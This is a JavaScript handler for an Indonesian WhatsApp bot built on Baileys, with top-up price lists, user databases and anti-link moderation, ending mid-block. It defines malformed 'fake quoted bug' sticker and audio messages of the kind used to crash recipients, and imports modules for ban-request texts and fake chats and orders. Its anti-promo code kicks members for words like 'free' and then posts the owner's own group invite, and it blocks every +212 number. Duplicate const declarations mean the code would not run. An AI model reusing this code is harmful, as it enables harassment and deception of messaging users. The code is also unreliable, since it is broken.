require('./all/settings')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
require("./all/global")
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./all/myfunc')
// read database
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const { color, bgcolor } = require('./all/color')
const { uptotelegra } = require('./all/upload')
const thumb = fs.readFileSync ('./thumb.png')
const pengguna = JSON.parse(fs.readFileSync('./all/database/owner.json'))
const isPremium = JSON.parse(fs.readFileSync('./all/database/premium.json'))
const isUser = pengguna.includes(m.sender)

module.exports = async (Biiofc, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const DigitalOcean = require('digitalocean');
const botNumber = await Biiofc.decodeJid(Biiofc.user.id)
const sender = m.key.fromMe ? (Biiofc.user.id.split(':')[0]+'@s.whatsapp.net' || Biiofc.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await Biiofc.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false 
const API_TOKEN = global.apitokendo;
const LINODE_API_TOKEN = global.apilinode;
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const jam = moment.tz('asia/jakarta').format("HH:mm:ss");
const hariini = moment.tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
const ffstalk = require('./scrape/ffstalk')
const scp1 = require('./scrape/scraper') 
const { Client } = require('ssh2');
const dns = require('dns');
const { addSaldo, minSaldo, cekSaldo, cekKoinPerak } = require("./all/database/deposit");
const { status, order_id, number, SMS } = JSON.parse(fs.readFileSync("./freya/status.json"))
const { remini } = require('./freya/remini')
const jsobfus = require('javascript-obfuscator')
const { mediafireDl } = require('./all/database/mediafire.js') 
const db_user = JSON.parse(fs.readFileSync('./freya/user.json'))
let db_saldo = JSON.parse(fs.readFileSync("./all/database/saldo.json"));
const pengguna = JSON.parse(fs.readFileSync('./database/user.json'))
const pler = JSON.parse(fs.readFileSync('./all/database/idgrup.json').toString())
const jangan = m.isGroup ? pler.includes(m.chat) : false


//antilink
let antipromosi = JSON.parse(fs.readFileSync('./database/antipromosi.json'))
let autojpm = JSON.parse(fs.readFileSync('./database/autojpm.json'))
let antivirus = JSON.parse(fs.readFileSync('./database/antivirus.json'))
let antitoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'))
let antiwame = JSON.parse(fs.readFileSync('./database/antiwame.json'))
let antilinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'))
let antilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'))
let antilinktwitter =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'))
let antilinktiktok =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'))
let antilinktelegram =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'))
let antilinkfacebook =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'))
let antilinkinstagram =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'))
let antilinkytchannel =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'))
let antilinkytvideo =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'))

//sewainbot
let sewa = {
rizalxdzzdev1: { nama: "1 Hari", harga: 5000, id: "rizalxdzzdev1" },
rizalxdzzdev2: { nama: "3 HARI", harga: 15000, id: "rizalxdzzdev2" },
rizalxdzzdev3: { nama: "5 HARI", harga: 25000, id: "rizalxdzzdev3" },
rizalxdzzdev4: { nama: "7 HARI", harga: 45000, id: "rizalxdzzdev4" },
rizalxdzzdev5: { nama: "10 HARI", harga: 55000, id: "rizalxdzzdev5" },
rizalxdzzdev6: { nama: "14 HARI", harga: 65000, id: "rizalxdzzdev6" },
rizalxdzzdev7: { nama: "21 HARI", harga: 75000, id: "rizalxdzzdev7" },
rizalxdzzdev8: { nama: "30 HARI", harga: 85000, id: "rizalxdzzdev8" },
rizalxdzzdev9: { nama: "UNLIMITED", harga: 95000, id: "rizalxdzzdev10" },
};

// LIST GG RIZAL STORE GMG BROH AOWKWOWKW

   // *⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST MOBILELEGENDS ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let ml = {
ML3: { nama: "MOBILELEGEND - 3 Diamond", harga: 1500, id: "ML3" },
ML5: { nama: "MOBILELEGEND - 5 Diamond", harga: 1700, id: "ML5" },
ML11: { nama: "MOBILELEGEND - 11 Diamond", harga: 2900, id: "ML11" },
ML10: { nama: "MOBILELEGEND - 10 Diamond", harga: 3000, id: "ML10" },
ML12: { nama: "MOBILELEGEND - 12 Diamond", harga: 3500, id: "ML12" },
ML14: { nama: "MOBILELEGEND - 14 Diamond", harga: 3600, id: "ML14" },
ML15: { nama: "MOBILELEGEND - 15 Diamond", harga: 4500, id: "ML15" },
ML17: { nama: "MOBILELEGEND - 17 Diamond", harga: 4700, id: "ML17" },
ML19: { nama: "MOBILELEGEND - 19 Diamond", harga: 5400, id: "ML19" },
ML22: { nama: "MOBILELEGEND - 22 Diamond", harga: 5500, id: "ML22" },
ML20: { nama: "MOBILELEGEND - 20 Diamond", harga: 6000, id: "ML20" },
ML28: { nama: "MOBILELEGEND - 28 Diamond", harga: 7000, id: "ML28" },
};
/*⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST DANA ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let dana = { 
DANA1: { nama: "DANA 1.000", harga: 2000, id: "DANA1" },
DANA2: { nama: "DANA 2.000", harga: 3000, id: "DANA2" },
DANA3: { nama: "DANA 3.000", harga: 4000, id: "DANA3" },
DANA4: { nama: "DANA 4.000", harga: 5000, id: "DANA4" },
DANA5: { nama: "DANA 5.000", harga: 6000, id: "DANA5" },
DANA6: { nama: "DANA 6.000", harga: 7000, id: "DANA6" },
DANA7: { nama: "DANA 7.000", harga: 8000, id: "DANA7" },
DANA8: { nama: "DANA 8.000", harga: 9000, id: "DANA8" },
DANA9: { nama: "DANA 9.000", harga: 10000, id: "DANA9" },
DANA10: { nama: "DANA 10.000", harga: 11000, id: "DANA10" },
DANA11: { nama: "DANA 11.000", harga: 12000, id: "DANA11" },
DANA12: { nama: "DANA 12.000", harga: 13000, id: "DANA12" },
DANA13: { nama: "DANA 13.000", harga: 14000, id: "DANA13" },
DANA14: { nama: "DANA 14.000", harga: 15000, id: "DANA14" },
DANA15: { nama: "DANA 15.000", harga: 16000, id: "DANA15" },
};
/*⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST GOPAY ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let gopay = {
GOPAY1: { nama: "SALDO GOPAY 1.000", harga: 2500, id: "GOPAY1" },
GOPAY2: { nama: "SALDO GOPAY 2.000", harga: 3500, id: "GOPAY2" },
GOPAY3: { nama: "SALDO GOPAY 3.000", harga: 4500, id: "GOPAY3" },
GOPAY4: { nama: "SALDO GOPAY 4.000", harga: 5500, id: "GOPAY4" },
GOPAY5: { nama: "SALDO GOPAY 5.000", harga: 6500, id: "GOPAY5" },
GOPAY6: { nama: "SALDO GOPAY 6.000", harga: 7500, id: "GOPAY6" },
GOPAY7: { nama: "SALDO GOPAY 7.000", harga: 8500, id: "GOPAY7" },
GOPAY8: { nama: "SALDO GOPAY 8.000", harga: 9500, id: "GOPAY8" },
GOPAY9: { nama: "SALDO GOPAY 9.000", harga: 10500, id: "GOPAY9" },
GOPAY10: { nama: "SALDO GOPAY 10.000", harga: 11500, id: "GOPAY10" },
};
/*⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST OVO ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let ovo = {
OVO5: { nama: "SALDO OVO 5.000", harga: 6000, id: "OVO5" },
OVO10: { nama: "SALDO OVO 10.000", harga: 11500, id: "OVO10" },
OVO15: { nama: "SALDO OVO 15.000", harga: 16500, id: "OVO15" },
OVO20: { nama: "SALDO OVO 20.000", harga: 21500, id: "OVO20" },
OVO25: { nama: "SALDO OVO 25.000", harga: 26500, id: "OVO25" },
OVO30: { nama: "SALDO OVO 30.000", harga: 31500, id: "OVO30" },
};
/*⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST  PUBG MOBILE ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let pubg = {
PUBG15: { nama: "PUBG MOBILE 15 UC", harga: 3000, id: "PUBG15" },
PUBG16: { nama: "PUBG MOBILE 16 UC", harga: 3200, id: "PUBG" },
PUBG25: { nama: "PUBG MOBILE 25 UC", harga: 4500, id: "PUBG" },
PUBG26: { nama: "PUBG MOBILE 26 UC", harga: 5200, id: "PUBG" },
};
/*⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST FREE FIRE ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let ff = {
FF5: { nama: "5 Diamond Free Fire", harga: 1000, id: "FF5" },
FF10: { nama: "10 Diamond Free Fire", harga: 2000, id: "FF10" },
FF12: { nama: "12 Diamond Free Fire", harga: 2100, id: "FF12" },
FF15: { nama: "15 Diamond Free Fire", harga: 2500, id: "FF15" },
FF20: { nama: "20 Diamond Free Fire", harga: 3300, id: "FF20" },
FF25: { nama: "25 Diamond Free Fire", harga: 4000, id: "FF25" },
FF30: { nama: "30 Diamond Free Fire", harga: 5000, id: "FF30" },
FF40: { nama: "40 Diamond Free Fire", harga: 5555, id: "FF40" },
FF50: { nama: "50 Diamond Free Fire", harga: 6233, id: "FF50" },
FF55: { nama: "55 Diamond Free Fire", harga: 7000, id: "FF55" },
FF60: { nama: "60 Diamond Free Fire", harga: 7700, id: "FF60" },
FF70: { nama: "70 Diamond Free Fire", harga: 9000, id: "FF70" },
FF75: { nama: "75 Diamond", harga: 9300, id: "FF75" },
FF90: { nama: "90 Diamond", harga: 11500, id: "FF90" },
};

//user
    let cekUser = (satu, dua) => { 
let x1 = false
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){x1 = i}})
if (x1 !== false) {
if (satu == "id"){ return db_user[x1].id }
if (satu == "name"){ return db_user[x1].name }
if (satu == "seri"){ return db_user[x1].seri }
if (satu == "premium"){ return db_user[x1].premium }
}
if (x1 == false) { return null } 
}

//setuser
let setUser = (satu, dua, tiga) => { 
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){
if (satu == "±id"){ db_user[i].id = tiga
fs.writeFileSync('./riza/user.json', JSON.stringify(db_user))} 
if (satu == "±name"){ db_user[i].name = tiga 
fs.writeFileSync('./rizal/user.json', JSON.stringify(db_user))} 
if (satu == "±seri"){ db_user[i].seri = tiga 
fs.writeFileSync('./rizal/user.json', JSON.stringify(db_user))} 
if (satu == "±premium"){ db_user[i].premium = tiga 
fs.writeFileSync('./rizal/user.json', JSON.stringify(db_user))}
}})
}
const checkIdSewa = (userId) => {
	const deppo = JSON.parse(fs.readFileSync(`./freya/sewa/${from}.json`))
    let status = false;
    Object.keys(deppo).forEach((i) => {
        if (deppo[i].id === userId) {
            status = true;
        }
    })
    return status
}
const checkRefSewa = (userId) => {
	const deppo = JSON.parse(fs.readFileSync(`./freya/sewa/${from}.json`))
    let status = ''
    Object.keys(deppo).forEach((i) => {
        if (deppo[i].id === userId) {
            status = deppo[i].ref
        }
    })
    return status
}
const checkStsSewa = (userId) => {
	const deppo = JSON.parse(fs.readFileSync(`./freya/sewa/${from}.json`))
    let status = ''
    Object.keys(deppo).forEach((i) => {
        if (deppo[i].id === userId) {
            status = deppo[i].status
        }
    })
    return status
}

//BanUser
const banUser = await Biiofc.fetchBlocklist

// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return Biiofc.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `${randomcolor}`), color(`FROM`, `${randomcolor}`), color(`${pushname}`, `${randomcolor}`), color(`Text :`, `${randomcolor}`), color(`${body}`, `white`))
}

//total fitur
const totalFitur = () =>{
            var mytext = fs.readFileSync("./appearance.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
// Database
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const premm = JSON.parse(fs.readFileSync("./all/database/premiumm.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./all/database/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isPremiumm = premm.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot
// Jangan Di Edit Tar Error
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await Biiofc.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\
N:${await Biiofc.getName(i + '@s.whatsapp.net')}\n
FN:${await Biiofc.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:tesheroku123@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://bit.ly/39Ivus6\n
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

//func makeid
const makeid = (length) => {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() *
    charactersLength));
    }
    return result
}

  function randomNomor(min, max = null) {
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
  }
   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await Biiofc.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
Biiofc.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => { 
Biiofc.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "OktzOffc🔥`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://s.id/OktzOffc", 
"sourceUrl": "https://s.id/OktzOffc" }}}, { quoted: m }) } 

function generateRandomPassword() {
  const characters = '0123456789';
  const length = 3;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}


// Pastikan Anda memiliki API token yang valid dari DigitalOcean dan disimpan dalam variabel API_TOKEN

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db || {})
}


//pickRandom
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

// TEXT BANNED
const { textbanv1, textbanv2, textbanv3, textbanv4, textbanv5, textbanv6, textbanv7, textbanv8, textbanv9, textbanv10, textbanv11, textbanv12, textbanv13, textbanv14, textbanv15, textbanv16, textbanv17, textbanv18, textbanv19, textbanv20, textbanv21, textbanv22, textbanv23, textbanv24, textbanv25, textbanv26, textbanv27, textbanv28, textbanv29, textbanv30, textbanv31, textbanv32, textbanv33, textbanv34, textbanv35, textbanv36, textbanv37, textbanv38 } = require('./wangsap/textban.js')

// TEXT UNBANNED
const { textunbanv1, textunbanv2, textunbanv3, textunbanv4, textunbanv5, textunbanv6, textunbanv7, textunbanv8, textunbanv9, textunbanv10, textunbanv11, textunbanv12, textunbanv13, textunbanv14, textunbanv15, textunbanv16, textunbanv17, textunbanv18, textunbanv19, textunbanv20, textunbanv21 } = require('./wangsap/textunban.js')

// TEXT FAKE CHAT 
const { fakec1, fakec2, fakec3, fakec4, fakec5, fakec6, fakec7, fakec8, fakec9, fakec10, fakec11 } = require('./wangsap/fakechat.js')

// TOTAL FITUR
const { totalfakechat, totalunban, totalban } = require('./wangsap/total.js')

// TEXT TOOLS
const { tools1, tools2 } = require('./wangsap/tools.js')

// SALDO BRIMO
const { saldoo } = require('./wangsap/saldoo.js')

//ssweb
const XeonStickWait = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/wait.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
        const XeonStickAdmin = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/admin.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
        const XeonStickBotAdmin = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/botadmin.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
        const XeonStickOwner = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/owner.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
        const XeonStickGroup = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/group.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
        const XeonStickPrivate = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/private.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }

// fake quoted bug
const lep = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
'isAnimated': []
}}}

const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `᭖͜͡DE4YOUJEMBOT-17 Offical`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;BiiofcBot,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/0fc4f6dbbc5d5f95ede6f.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

 // Antipromosi
  if (antipromosi)
  if (budy.includes(`admin panel 5k`)) {
if (!isBotAdmins) return
bvl = `\`\`\`JOIN GUYS 200 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`JOIN GUYS 200 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antipromosi)
  if (budy.includes(`admin panel 10k`)) {
if (!isBotAdmins) return
bvl = `\`\`\`JJOIN GUYS 200 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`JOIN GUYS 200 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antipromosi)
  if (budy.includes(`35k`)) {
if (!isBotAdmins) return
bvl = `\`\`\`JOIN GUYS 200 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antipromosi)
  if (budy.includes(`25k`)) {
if (!isBotAdmins) return
bvl = `\`\`\`JOIN GUYS 200 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`JOIN GUYS 200 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antipromosi)
  if (budy.includes(`40k`)) {
if (!isBotAdmins) return
bvl = `\`\`\`JOIN GUYS 200 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antipromosi)
  if (budy.includes(`free`)) {
if (!isBotAdmins) return
bvl = `\`\`\`JOIN GUYS 200 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`JOIN GUYS 200 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
// auto jpm
        if (autojpm) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return reply(mess.only.badmin)
        let gclink = (`https://chat.whatsapp.com/`+await Biiofc.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return Biiofc.sendMessage(m.chat, {text: `\`\`\`JOIN GUYS 200 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Fxy4fdFzMzAGlNYwqLcnaz`})
